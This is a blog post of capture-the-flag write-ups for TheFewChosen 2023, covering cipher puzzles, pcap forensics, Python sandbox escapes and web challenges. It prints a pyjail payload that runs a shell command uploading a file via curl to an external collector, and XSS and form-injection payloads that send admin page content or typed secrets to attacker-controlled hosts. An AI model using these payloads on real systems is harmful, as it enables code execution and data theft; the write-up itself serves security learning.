---
layout: post
title: TheFewChosen 2023
---

# Crypto
## Dizzy
We're given this to decipher:
```
T4 l16 _36 510 _27 s26 _11 320 414 {6 }39 C2 T0 m28 317 y35 d31 F1 m22 g19 d38 z34 423 l15 329 c12 ;37 19 h13 _30 F5 t7 C3 325 z33 _21 h8 n18 132 k24
```
The solution is to rearrange the characters in order and the order is determined by the number attached after it.
```python
f = "T4 l16 _36 510 _27 s26 _11 320 414 {6 }39 C2 T0 m28 317 y35 d31 F1 m22 g19 d38 z34 423 l15 329 c12 ;37 19 h13 _30 F5 t7 C3 325 z33 _21 h8 n18 132 k24".split()
f
['T4', 'l16', '_36', '510', '_27', 's26', '_11', '320', '414', '{6', '}39', 'C2', 'T0', 'm28', '317', 'y35', 'd31', 'F1', 'm22', 'g19', 'd38', 'z34', '423', 'l15', '329', 'c12', ';37', '19', 'h13', '_30', 'F5', 't7', 'C3', '325', 'z33', '_21', 'h8', 'n18', '132', 'k24']
d = {}
for x in f:
    d[x[1:]] = x[0]

flag = ""
for i in range(len(d.keys())):
    flag += d[str(i)]

print(flag)
```
Running the script gives the flag:
```
TFCCTF{th15_ch4ll3ng3_m4k3s_m3_d1zzy_;d}
```

## MayDay!
We're given this to decipher:
```
Whiskey Hotel Four Tango Dash Alpha Romeo Three Dash Yankee Oscar Uniform Dash Sierra One November Kilo India November Golf Dash Four Bravo Zero Uniform Seven
```
Putting this into [cryptii](https://cryptii.com/pipes/nato-phonetic-alphabet) yields:
```
wh4tDashAlphar3DashyouDashs1nkingDash4b0u7
```
The flag is:
```
TFCTF{WH4T-AR3-YOU-S1NKING-4B0U7}
```

<!--
## Alien Music
## AES CTF Tool V1
## AES CTF Tool V2

# Pwn
## Diary
## Shello World
## Random
## Notes

# Rev
## Pass

## Down Bad
## List
-->
# Forensics
## Some Traffic
We're given a pcapng file to analyse. From reading the requests we can see a few HTTP POST requests containing image files.

We can convert the pcapng to a pcap file by opening it in Wireshark and saving it. Now we can use [Network Miner](https://www.netresec.com/?page=NetworkMiner) to extract the image files that are being uploaded in it.
![network miner]({{ site.baseurl }}/images/thefewchosen/network_miner.png)

The flag can be extracted by running zsteg on the third image (output_modified.png) or by uploading it to [AperiSolve](aperisolve.com). In this case however AperiSolve was inconsistent in showing the full ztego output with the flag.

Flag:
```
TFCCTF{H1dd3n_d4t4_1n_p1x3ls_i5n't_f4n_4nd_e4sy_to_f1nd!}
```

# Misc
## Discord Shenanigans V3
The discord bot has an avatar with the flag in it, you can get it by using inspect element and downloading the discord avatar.

## My First Calculator
This challenge is a pyjail where we can't use letters or full stop.
```python
import sys

print("This is a calculator")

inp = input("Formula: ")

sys.stdin.close()

blacklist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ."

if any(x in inp for x in blacklist):
    print("Nice try")
    exit()

fns = {
    "pow": pow
}

print(eval(inp, fns, fns))
```
This restriction can be bypassed by using italic characters that get normalised by python.
You can use [lingojam's italic text generator](https://lingojam.com/ItalicTextGenerator) to do this. We used exec with the rest encoded in octal to get the flag.

Before transformation:
```
exec('print(open("flag").read())')
```

After:
```
𝘦𝘹𝘦𝘤('\160\162\151\156\164\050\157\160\145\156\050\042\146\154\141\147\042\051\056\162\145\141\144\050\051\051')
```
Putting this in gives us the flag:
```
TFCCTF{18641f40c9beac02ceeaf87db851c386}
```

## My Third Calculator
This is the next pyjail challenge (there was no second calculator).
```python
import sys

print("This is a safe calculator")

inp = input("Formula: ")

sys.stdin.close()

blacklist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ."

if any(x in inp for x in blacklist):
    print("Nice try")
    exit()

fns = {
    "__builtins__": {"setattr": setattr, "__import__": __import__, "chr": chr}
}

print(eval(inp, fns, fns))
```
This time builtins are overwritten except for setattr, \_\_import\_\_ and chr.

We can change strings into a bunch of chr() calls using this smol script:
```python
def text_to_character_code(text):
    return "+".join([f"char({ord(x)})" for x in text])

print(text_to_character_code(input('input>')))
```

After looking through old pyjail solutions we ended up using the antigravity payload:
```python
__import__('antigravity',setattr(__import__('os'),'environ',{'BROWSER':'/bin/sh -c "curl -T flag cj2hjb3b7pnbr8g80gf0ifgcciwaz587a.oast.fun;exit" #%s'})) 
```
The antigravity module is a joke module that is a reference to [XKCD #353](https://xkcd.com/353/) and importing it opens that XKCD comic in the browser. We can overwrite the browser env variable with our shell command and that gets executed instead of the browser when it gets imported.

We transform this payload by changing all the strings into chr() calls and italicising like before:

```python
__𝘪𝘮𝘱𝘰𝘳𝘵__(𝘤𝘩𝘳(97)+𝘤𝘩𝘳(110)+𝘤𝘩𝘳(116)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(103)+𝘤𝘩𝘳(114)+𝘤𝘩𝘳(97)+𝘤𝘩𝘳(118)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(116)+𝘤𝘩𝘳(121),𝘴𝘦𝘵𝘢𝘵𝘵𝘳(__𝘪𝘮𝘱𝘰𝘳𝘵__(𝘤𝘩𝘳(111)+𝘤𝘩𝘳(115)),𝘤𝘩𝘳(101)+𝘤𝘩𝘳(110)+𝘤𝘩𝘳(118)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(114)+𝘤𝘩𝘳(111)+𝘤𝘩𝘳(110),{𝘤𝘩𝘳(66)+𝘤𝘩𝘳(82)+𝘤𝘩𝘳(79)+𝘤𝘩𝘳(87)+𝘤𝘩𝘳(83)+𝘤𝘩𝘳(69)+𝘤𝘩𝘳(82):𝘤𝘩𝘳(47)+𝘤𝘩𝘳(98)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(110)+𝘤𝘩𝘳(47)+𝘤𝘩𝘳(115)+𝘤𝘩𝘳(104)+𝘤𝘩𝘳(32)+𝘤𝘩𝘳(45)+𝘤𝘩𝘳(99)+𝘤𝘩𝘳(32)+𝘤𝘩𝘳(34)+𝘤𝘩𝘳(99)+𝘤𝘩𝘳(117)+𝘤𝘩𝘳(114)+𝘤𝘩𝘳(108)+𝘤𝘩𝘳(32)+𝘤𝘩𝘳(45)+𝘤𝘩𝘳(84)+𝘤𝘩𝘳(32)+𝘤𝘩𝘳(102)+𝘤𝘩𝘳(108)+𝘤𝘩𝘳(97)+𝘤𝘩𝘳(103)+𝘤𝘩𝘳(32)+𝘤𝘩𝘳(99)+𝘤𝘩𝘳(106)+𝘤𝘩𝘳(50)+𝘤𝘩𝘳(104)+𝘤𝘩𝘳(106)+𝘤𝘩𝘳(98)+𝘤𝘩𝘳(51)+𝘤𝘩𝘳(98)+𝘤𝘩𝘳(55)+𝘤𝘩𝘳(112)+𝘤𝘩𝘳(110)+𝘤𝘩𝘳(98)+𝘤𝘩𝘳(114)+𝘤𝘩𝘳(56)+𝘤𝘩𝘳(103)+𝘤𝘩𝘳(56)+𝘤𝘩𝘳(48)+𝘤𝘩𝘳(103)+𝘤𝘩𝘳(102)+𝘤𝘩𝘳(48)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(102)+𝘤𝘩𝘳(103)+𝘤𝘩𝘳(99)+𝘤𝘩𝘳(99)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(119)+𝘤𝘩𝘳(97)+𝘤𝘩𝘳(122)+𝘤𝘩𝘳(53)+𝘤𝘩𝘳(56)+𝘤𝘩𝘳(55)+𝘤𝘩𝘳(97)+𝘤𝘩𝘳(46)+𝘤𝘩𝘳(111)+𝘤𝘩𝘳(111)+𝘤𝘩𝘳(98)+𝘤𝘩𝘳(112)+𝘤𝘩𝘳(111)+𝘤𝘩𝘳(99)+𝘤𝘩𝘳(46)+𝘤𝘩𝘳(99)+𝘤𝘩𝘳(111)+𝘤𝘩𝘳(109)+𝘤𝘩𝘳(59)+𝘤𝘩𝘳(101)+𝘤𝘩𝘳(120)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(116)+𝘤𝘩𝘳(34)+𝘤𝘩𝘳(32)+𝘤𝘩𝘳(35)+𝘤𝘩𝘳(37)+𝘤𝘩𝘳(115)}))
```
Submitting this gave us the flag:
```
TFCCTF{60c7502daf7f94106a295d7dea14b63df2048f8d}
```

# Web
## Baby Ducky Notes
We're given the source code for this notes app. First we checked for where the flag is located.
```python
    query(con, f'''
    INSERT INTO posts (
        user_id,
        title,
        content,
        hidden
        ) VALUES (
            1,
            'Here is a ducky flag!',
            '{os.environ.get("FLAG")}',
            0

    );
    ''')
```
The flag is in the db as a post by the admin but the hidden column is set to 0 so it is publically viewable.

Checking the routes we find where we can view it:
```python
@web.route('/posts/view/<user>', methods=['GET'])
@auth_required
def posts_view(username, user):
    try:
        posts = db_get_user_posts(user, username == user)
    except:
        raise Exception(username)

    return render_template('posts.html', posts=posts)
```
We see the flag by visiting http://challs.tfcctf.com:30395/posts/view/admin
![screenshot of the flag]({{ site.baseurl }}/images/thefewchosen/baby_ducky_notes.png)
Flag:
```
TFCCTF{Adm1n_l0St_h1s_m1nd!} 
```

## Baby Ducky Notes: Revenge
The challenge has patched the previous issue but there is more to find.
This time the flag is a hidden post so we can't see it just by visiting the URL because  hidden posts can only be seen by the user who uploaded them.
We need to XSS the admin and get them to visit that page and send us the content.
In the flask template for the posts page we see the following:
```
<p> {{post.get('content') | safe}} </p>
```
The usage of "safe" here means that flask will not sanitize the post content which allows us to XSS
So we make a new post with this as the post content:
```html
<script>
var http=new XMLHttpRequest();
http.open('GET','http://challs.tfcctf.com:31743/posts/view/admin', true);
http.onreadystatechange=function(){
    var out = new XMLHttpRequest();
    out.open('POST','https://cj1r2h01ft1j3g1e3q6gkn5t3bkzmpudp.oast.live')
    out.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    out.send('data='+btoa(http.responseText));
}
http.send();
</script>
```
We get this response on our interactsh output:
```
POST / HTTP/2.0
Host: cj1r2h01ft1j3g1e3q6gkn5t3bkzmpudp.oast.live
Accept: */*
Accept-Encoding: gzip, deflate, br
Content-Length: 5
Content-Type: application/x-www-form-urlencoded
Origin: http://localhost:1337
Referer: http://localhost:1337/
Sec-Ch-Ua: "Not/A)Brand";v="99", "HeadlessChrome";v="115", "Chromium";v="115"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/115.0.5790.110 Safari/537.36

data=
```
No data? Strange. The referer and origin reveal that the URL for the bot is not the same as the one we see so we must change our payload to account for that as the cookies are tied to that URL.
Final payload:
```html
<script>
var http=new XMLHttpRequest();
http.open('GET','http://localhost:1337/posts/view/admin', true);
http.onreadystatechange=function(){
    var out = new XMLHttpRequest();
    out.open('POST','https://cj1r2h01ft1j3g1e3q6gkn5t3bkzmpudp.oast.live')
    out.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    out.send('data='+btoa(http.responseText));
}
http.send();
</script>
```
We get back:
```
data=PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCjxoZWFkPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCI+CiAgICA8dGl0bGU+QmFieSBEdWNreSBOb3RlczogUmV2ZW5nZSE8L3RpdGxlPgogICAgPHNjcmlwdCBzcmM9Ii9zdGF0aWMvanMvanF1ZXJ5LmpzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQgc3JjPSIvc3RhdGljL2pzL3JlcG9ydC5qcyI+PC9zY3JpcHQ+CiAgICA8bGluayByZWw9InByZWNvbm5lY3QiIGhyZWY9Imh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20iPgogICAgPGxpbmsgcmVsPSJwcmVjb25uZWN0IiBocmVmPSJodHRwczovL2ZvbnRzLmdzdGF0aWMuY29tIiBjcm9zc29yaWdpbj4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iL3N0YXRpYy9jc3Mvc3R5bGVzLmNzcyIgLz4KPC9oZWFkPgoKPGJvZHk+CiAgICAKICAgIDxuYXYgY2xhc3M9Im5hdmJhciI+CiAgICAgICAgPGRpdiBpZD0idHJhcGV6b2lkIj4KICAgICAgICAgICAgPGEgaHJlZj0iL2xvZ2luIiBjbGFzcz0iZXhwYW5kSG9tZSI+TG9naW48L2E+CiAgICAgICAgICAgIDxhIGhyZWY9Ii9yZWdpc3RlciIgY2xhc3M9ImV4cGFuZEhvbWUiPlJlZ2lzdGVyPC9hPgogICAgICAgICAgICA8YSBocmVmPSIvcG9zdHMvdmlldy9hZG1pbiIgY2xhc3M9ImV4cGFuZEhvbWUiPlZpZXc8L2E+CiAgICAgICAgICAgIDxhIGhyZWY9Ii9wb3N0cy9jcmVhdGUiIGNsYXNzPSJleHBhbmRIb21lIj5DcmVhdGU8L2E+CiAgICAgICAgPC9kaXY+CiAgICA8L25hdj4KCiAgICA8ZGl2IGNsYXNzPSJwb3N0c19saXN0Ij4KICAgIDx1bCBjbGFzcz0icG9zdHNfdWwiPgogICAgICAgIAogICAgICAgIDxsaT4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iYmxvZ19wb3N0Ij4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lcl9jb3B5Ij4KICAgICAgICAgICAgICAgICAgPGgxPiBIZXJlIGlzIGEgZHVja3kgZmxhZyEgPC9oMT4KICAgICAgICAgICAgICAgICAgPGgzPiBhZG1pbiA8L2gzPgogICAgICAgICAgICAgICAgICA8cD4gVEZDQ1RGe0V2M3J5X2R1Q2tfa24wdzVfeFNzIX0gPC9wPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvbGk+CiAgICAgICAgIAogICAgPC91bD4KICAgIDwvZGl2PgoKICAgIDxkaXYgY2xhc3M9InJlcG9ydCI+CiAgICAgICAgPGRpdiBjbGFzcz0ibWVzc2FnZSIgaWQ9ImFsZXJ0LW1zZyIgaGlkZGVuID48L2Rpdj4KICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgaWQ9InJlcG9ydC1idG4iPlJlcG9ydCB0byBhZG1pbjwvYnV0dG9uPgogICAgPC9kaXY+CiAgICAKICAgIDxmb290ZXI+CiAgICAgICAgPGRpdiBjbGFzcz0iZm9vdGVyLWNvbnRlbnQiPgogICAgICAgICAgICA8aDM+RGlzY2xhaW1lcjwvaDM+CiAgICAgICAgICAgIDxwPlRoaXMgY2hhbGxlbmdlIGlzIG1hZGUgdG8gYmUgaGFja2VkLiBBbnkgaW5kaWNhdGlvbiBvZiBwcm9wZXIgdXNhZ2Ugb3IgdW50YXBwZWQgYWN0aXZpdHkgd2lsbCByZXN1bHQgaW4gbGVnYWwgc2FuY3Rpb25zLiBIYXBweSBoYWNraW5nITwvcD4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJmb290ZXItYm90dG9tIj4KICAgICAgICAgICAgPHA+Y29weXJpZ2h0ICZjb3B5OyA8YSBocmVmPSIjIj5TYWdpIC8gVGhlIEZldyBDaG9zZW4gQ1RGIDIwMjMgPC9hPiAgPC9wPgogICAgICAgICAgICA8ZGl2IGlkPSJwb3QiPgogICAgICAgICAgICAgICAgPGltZyBzcmM9Ii9zdGF0aWMvaW1hZ2VzL2R1Y2suZ2lmIiB3aWR0aD0xMDBweCBoZWlnaHQ9MTAwcHg+CiAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CgogICAgPC9mb290ZXI+CiAgICAKPC9ib2R5PgoKPC9odG1sPg==
```
Base64 decoding that and we get the flag:
```
            <div class="blog_post">
                <div class="container_copy">
                  <h1> Here is a ducky flag! </h1>
                  <h3> admin </h3>
                  <p> TFCCTF{Ev3ry_duCk_kn0w5_xSs!} </p>
                </div>
```

## Cookie Store
This is another XSS challenge. This time the bot types the flag into a form as we can see in the source code we're given:
```python
    client.get(f"http://localhost:1337/form_builder?fields={fields}")
    time.sleep(2)
    client.find_element(By.ID, "title").send_keys(FLAG)
    client.execute_script("""document.querySelector('input[type="submit"]').click();""")
    time.sleep(2)
```
Initially it seemed like this was going to be an XSS challenge. We can see we can get HTML injection as the javascript dynamically modifies the page in `templates/form_builder.html`:
```js
    let form_html = '';
    let fields_list = [];
    if (fields) {
        fields_list = fields.split(',');
        fields_list.forEach(element => {
            form_html += `<div class="mb-4">
                <label for="${element}" class="block text-gray-700 font-bold mb-2">${element}</label>
                <input type="text" name="${element}" id="${element}" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline">
            </div>`;
        });
    }
    // This will sanitize the input
    document.querySelector('#form_builder').setHTML(form_html);
```
This setHTML function didn't work in my browser but it's supposed to sanitize HTML to disallow most forms of XSS so script tags dont work and event attributes like onclick etc also don't work.

We were able to get the flag with this payload:
```html
<input type="submit" formaction="http://cj2o7ibb7pn8qd9o99dg8w48u735kpf5k.oast.fun/lol" />
```
The bot will click this button as its earlier on the page than the other. According to the [docs from Mozilla](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/submit#formaction) the formaction attribute takes precedence over the action attribute on the form element so the inputs in the form will go to our page instead of the intended one.

In the interactsh window we got the flag:
```
TFCCTF{144ab0e4c358b00b1258f2aea2250b21}
```

Another approach we looked into was CSS injection where we extract the flag character by character but that didn't work.

Another technique that did work was redirecting to a page we control and then getting the contents of that form.
Payload: ```<meta http-equiv="refresh" content="0; url=http://ourserver">```
On our server we have the page:
```html
<form method="post" action="http://ourserver/log">
    <input type="text" name="title" id="title">
    <input type="submit" value="Submit">
</form>
```
By saving whats submitted to log we get the flag.

## McTree
This is a very basic web app. There is a register page and a login page. When we login we get a message 
```
Get out of here, username!
```
From testing different things we noticed that some characters were filtered from the username like '{'

By registering an account with the username 'admin{' the password for the admin account gets changed and we can login.

The flag is then shown on the page:
```
TFCCTF{I_l1k3_dr4g0n_tr33s__Yuh!_1ts_my_f4v0r1t3_tr33_f0r_sur3!}
```

